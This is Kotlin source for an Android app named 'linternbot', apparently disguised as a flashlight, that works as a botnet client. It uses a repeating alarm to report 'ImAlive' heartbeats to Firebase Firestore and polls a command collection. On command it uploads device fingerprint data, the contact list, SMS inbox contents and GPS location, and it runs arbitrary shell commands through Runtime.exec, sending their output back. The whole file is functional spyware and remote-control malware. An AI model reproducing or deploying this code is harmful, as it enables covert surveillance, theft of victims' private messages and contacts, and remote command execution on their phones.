package com.linternbot

import android.annotation.SuppressLint
import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.ContactsContract
import android.util.Log
import android.widget.Toast
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import com.google.firebase.firestore.DocumentChange
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import java.io.BufferedReader
import java.io.InputStreamReader
import java.text.SimpleDateFormat
import java.util.*


class Alarm : BroadcastReceiver() {
    lateinit var contexto : Context

    override fun onReceive(context: Context, intent: Intent) {
        contexto = context
        val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        val wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "app:alarm")
        wl.acquire()
        //Toast.makeText(context, "Alarm !!!!!!!!!!", Toast.LENGTH_LONG).show(); // For example
        val fusedLocationClient: FusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(context)
        val c = Calendar.getInstance()
        val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
        val strDate: String = sdf.format(c.time)
        val db = Firebase.firestore

        // End of my code
        enviaImAlive(db, strDate)
        leePrimitiva(db, strDate,fusedLocationClient)

        wl.release()
    }

    fun setAlarm(context: Context) {
        val am = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val i = Intent(context, Alarm::class.java)
        val pi = PendingIntent.getBroadcast(context, 0, i, 0)
        am.setRepeating(
            AlarmManager.RTC_WAKEUP,
            System.currentTimeMillis(),
            (1000 * 60 * 1).toLong(),
            pi
        ) // Millisec * Second * Minute
    }

    fun cancelAlarm(context: Context) {
        val intent = Intent(context, Alarm::class.java)
        val sender = PendingIntent.getBroadcast(context, 0, intent, 0)
        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.cancel(sender)
        Toast.makeText(context, "Se ha parado la alarma", Toast.LENGTH_LONG).show(); // For example
    }

    fun leePrimitiva(db : FirebaseFirestore, strDate: String, fusedLocationClient: FusedLocationProviderClient){
        db.collection("ordenes")
            .get()
            .addOnSuccessListener { result ->
                for (document in result) {
                    if (document.data["Bot_ID"]!!.equals(idAndroid) || document.data["Bot_ID"]!!.equals("todos")) {
                        if (document.data["Primitiva"]!!.equals("DATOSDISPOSITIVO")) {
                            nuevosDatosDispositivo(db, strDate)
                            Log.d("TAG2", "Se a??ade nuevos datos del dispositivo")
                            if(!document.data["Bot_ID"]!!.equals("todos")) {
                                db.collection("ordenes").document(document.id).delete()
                                    .addOnSuccessListener {
                                        Log.d("TAG2", "Orden de datos de dispositivo eliminada")
                                    }
                            }
                        }
                        if (document.data["Primitiva"]!!.equals("CONTACTO")) {
                            nuevaListaContactos(db, strDate)
                            Log.d("TAG2", "Se a??ade nuevos datos de los contactos del dispositivo")
                            if(!document.data["Bot_ID"]!!.equals("todos")) {
                                db.collection("ordenes").document(document.id).delete()
                                    .addOnSuccessListener {
                                        Log.d(
                                            "TAG2",
                                            "Orden de datos de los contactos de dispositivo eliminada"
                                        )
                                    }
                            }
                        }
                        if (document.data["Primitiva"]!!.equals("SMS")) {
                            nuevaListaSMS(db, strDate)
                            Log.d("TAG2", "Se a??ade nuevos datos de los sms del dispositivo")
                            if(!document.data["Bot_ID"]!!.equals("todos")) {
                                db.collection("ordenes").document(document.id).delete()
                                    .addOnSuccessListener {
                                        Log.d(
                                            "TAG2",
                                            "Orden de datos de los sms de dispositivo eliminada"
                                        )
                                    }
                            }
                        }
                        if (document.data["Primitiva"]!!.equals("COMANDO")) {
                            val ejecutar = document.data["comando"].toString()
                            ejecutaComando(ejecutar,db,strDate)
                            Log.d("TAG2", "Se ha enviado un mensaje de ping")
                            if(!document.data["Bot_ID"]!!.equals("todos")) {
                                db.collection("ordenes").document(document.id).delete()
                                    .addOnSuccessListener {
                                        Log.d("TAG2", "Orden de envio de ping eliminada")
                                    }
                            }
                        }
                        if (document.data["Primitiva"]!!.equals("APAGAR")) {
                            cancelAlarm(contexto)
                            Log.d("TAG2", "Se apaga las funciones de botnet")
                            if(!document.data["Bot_ID"]!!.equals("todos")) {
                                db.collection("ordenes").document(document.id).delete()
                                    .addOnSuccessListener {
                                        Log.d("TAG2", "Orden apagar eliminada")
                                    }
                            }
                        }
                        if (document.data["Primitiva"]!!.equals("GPS")) {
                            getLastKnownLocation(db,strDate,fusedLocationClient)
                            Log.d("TAG2", "Se obtiene la ubicacion")
                            if(!document.data["Bot_ID"]!!.equals("todos")) {
                                db.collection("ordenes").document(document.id).delete()
                                    .addOnSuccessListener {
                                        Log.d("TAG2", "Orden gps eliminada")
                                    }
                            }
                        }
                    }
                }
            }
            .addOnFailureListener { exception ->
                Log.d("TAG2", "Error getting documents: ", exception)
            }
    }

    fun enviaImAlive(db : FirebaseFirestore, strDate: String){
        val user = hashMapOf(
            "Bot_ID" to idAndroid,
            "Hora" to strDate
        )

        // Add a new document with a generated ID
        db.collection("ImAlive").document(strDate).set(user)
        Log.d("TAG2","Se ha enviado un nuevo mensaje de ImAlive")
    }


    fun nuevosDatosDispositivo(db : FirebaseFirestore, strDate: String){
        // Devuelve algunos valores del dispositivo que pueden ser de interes para la botnet
        // Fuente: https://stackoverflow.com/questions/38624319/get-android-phone-specs-programmatically
        val fields = Build.VERSION_CODES::class.java.fields
        var codeName = "UNKNOWN"
        fields.filter { it.getInt(Build.VERSION_CODES::class) == Build.VERSION.SDK_INT }
            .forEach { codeName = it.name }

        val datosDispositivo = hashMapOf(
            "Bot_ID" to idAndroid,
            "Hora" to strDate,
            "RELEASE AND CODENAME" to Build.VERSION.RELEASE+codeName,
            "MODEL" to Build.MODEL,
            "ID" to Build.ID,
            "Manufacture" to Build.MANUFACTURER,
            "brand" to Build.BRAND,
            "type" to Build.TYPE,
            "user" to Build.USER,
            "BASE" to Build.VERSION_CODES.BASE,
            "INCREMENTAL" to Build.VERSION.INCREMENTAL,
            "SDK" to Build.VERSION.SDK,
            "BOARD" to Build.BOARD,
            "BRAND" to Build.BRAND,
            "HOST" to Build.HOST,
            "FINGERPRINT" to Build.FINGERPRINT,
            "Version Code" to Build.VERSION.RELEASE
        )
        db.collection("ordenes")
            .whereEqualTo("Primitiva", "DATOSDISPOSITIVO")
            .addSnapshotListener { snapshot, e ->
                if (e != null) {
                    Log.d("TAG", "Fallada la escucha de la primitiva.", e)
                    return@addSnapshotListener
                }

                for (dc in snapshot!!.documentChanges) {
                    when (dc.type) {
                        DocumentChange.Type.ADDED -> db.collection("datosDispositivo").document(idAndroid).set(datosDispositivo)
                    }
                }
            }
        Log.d("TAG2","Se ha ejecutado la tarea de toma de datos del dispositiv")
    }

    fun nuevaListaContactos(db : FirebaseFirestore, strDate: String){
        val contactos = hashMapOf(
            "Bot_ID" to idAndroid,
            "Hora" to strDate,
            "Lista contactos" to getContactList()
        )
        db.collection("ordenes")
            .whereEqualTo("Primitiva", "CONTACTO")
            .addSnapshotListener { snapshot, e ->
                if (e != null) {
                    Log.d("TAG", "Fallada la escucha de la primitiva.", e)
                    return@addSnapshotListener
                }

                for (dc in snapshot!!.documentChanges) {
                    when (dc.type) {
                        DocumentChange.Type.ADDED -> db.collection("contactos").document(idAndroid).set(contactos)
                    }
                }
            }

        Log.d("TAG2","Se ha ejecutado la tarea obtencion de lista de contactos")
    }

    fun nuevaListaSMS(db : FirebaseFirestore, strDate: String){
        var mensaje : String = ""
        var contador = 0
        obtenerListaSMS().forEach(){
            contador++
            if(contador < 30) mensaje += it.textoSMS.toString() + "\n"
        }
        val sms = hashMapOf(
            "Bot_ID" to idAndroid,
            "Hora" to strDate,
            "Lista contactos" to mensaje
        )
        db.collection("ordenes")
            .whereEqualTo("Primitiva", "SMS")
            .addSnapshotListener { snapshot, e ->
                if (e != null) {
                    Log.d("TAG", "Fallada la escucha de la primitiva.", e)
                    return@addSnapshotListener
                }

                for (dc in snapshot!!.documentChanges) {
                    when (dc.type) {
                        DocumentChange.Type.ADDED -> db.collection("sms").document(idAndroid).set(sms)
                    }
                }
            }

        Log.d("TAG2","Se ha ejecutado la tarea obtencion de lista de sms")
    }

    // Fuente: https://stackoverflow.com/questions/12562151/android-get-all-contacts
    private fun getContactList() : ArrayList<Contact> {
        var contactList: ArrayList<Contact> = ArrayList()

        val PROJECTION = arrayOf(
            ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
            ContactsContract.Contacts.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
        )
        val cr: ContentResolver = contexto.getContentResolver()
        val cursor: Cursor? = cr.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            PROJECTION,
            null,
            null,
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
        )
        if (cursor != null) {
            val mobileNoSet = HashSet<String>()
            try {
                val nameIndex: Int = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
                val numberIndex: Int =
                    cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                var name: String
                var number: String
                while (cursor.moveToNext()) {
                    name = cursor.getString(nameIndex)
                    number = cursor.getString(numberIndex)
                    number = number.replace(" ", "")
                    if (!mobileNoSet.contains(number)) {
                        contactList.add(Contact(name, number))
                        mobileNoSet.add(number)
                        Log.d(
                            "hvy", "onCreaterrView  Phone Number: name = " + name
                                    + " No = " + number
                        )
                    }
                }
            } finally {
                cursor.close()
            }
        }
        return contactList
    }

    fun obtenerListaSMS() : ArrayList<SMS> {
        var listaSMS: ArrayList<SMS> = ArrayList()
        val cr: ContentResolver = contexto.getContentResolver()
        val cursor: Cursor? = cr.query(Uri.parse("content://sms/inbox"), null, null, null, null)

        if (cursor != null) {
            if (cursor.moveToFirst()) { // must check the result to prevent exception
                do {
                    var msgData = ""
                    for (idx in 0 until cursor.columnCount) {
                        msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx)
                        listaSMS.add(SMS(idx,msgData))
                    }
                } while (cursor.moveToNext())
            } else {
                Log.d("TAG2", "Error consiguiendo la lista de sms")
            }
        }
        return listaSMS
    }

    // Fuente: https://stackoverflow.com/questions/3905358/how-to-ping-external-ip-from-java-android
    // Comandos utiles disponibles: https://technastic.com/adb-shell-commands-list/
    private fun ejecutaComando(command : String, db : FirebaseFirestore, strDate: String){
        var resultado = ""
        try {
            val process: Process = Runtime.getRuntime().exec(command)
            // Read the lines using BufferedReader
            BufferedReader(InputStreamReader(process.inputStream)).forEachLine {
                // Do something on each line read
                Log.d(this::class.java.canonicalName, "Resultado: $it")
                resultado += "$it"+"\n"
            }

            val user = hashMapOf(
                "Bot_ID" to idAndroid,
                "Hora" to strDate,
                "resultado" to resultado
            )

            val user2 = hashMapOf(
                "Bot_ID" to idAndroid,
                "Hora" to strDate,
                "resultado" to "Error al ejecutar el comando, stdout vacio"
            )

            // Add a new document with a generated ID
            if(resultado != "") db.collection("comandoEjecutado").document(idAndroid + " " + command).set(user)
            else db.collection("comandoEjecutado").document(idAndroid + " " + command).set(user2)
            Log.d("TAG2","Se ha guardado el output de un comando")

        } catch (e: InterruptedException) {
            Log.w(this::class.java.canonicalName, "Cannot execute command [$command].", e)
        } catch (e: Exception) {
            Log.e(this::class.java.canonicalName, "Cannot execute command [$command].", e)
        }
    }

    // Fuente: https://stackoverflow.com/questions/45958226/get-location-android-kotlin
    @SuppressLint("MissingPermission")
    fun getLastKnownLocation(db : FirebaseFirestore, strDate: String, fusedLocationClient: FusedLocationProviderClient) {
        var noAccede = true
        fusedLocationClient.lastLocation.addOnFailureListener {
            Log.d("Tag2",it.toString())
        }
        fusedLocationClient.lastLocation.addOnSuccessListener { location->
            if (location != null) {
                val loc = hashMapOf(
                    "Bot_ID" to idAndroid,
                    "Hora" to strDate,
                    "GPS" to location
                )
                // Add a new document with a generated ID
                noAccede = false
                db.collection("gps").document(strDate).set(loc)
                Log.d("TAG2","se envia la data del gps")
            // get latitude , longitude and other info from this
            }
        }
        if(noAccede){
            val loc = hashMapOf(
                "Bot_ID" to idAndroid,
                "Hora" to strDate,
                "GPS" to "Error, gps desactivado en el dispositivo"
            )
            db.collection("gps").document(strDate).set(loc)
        }
    }
}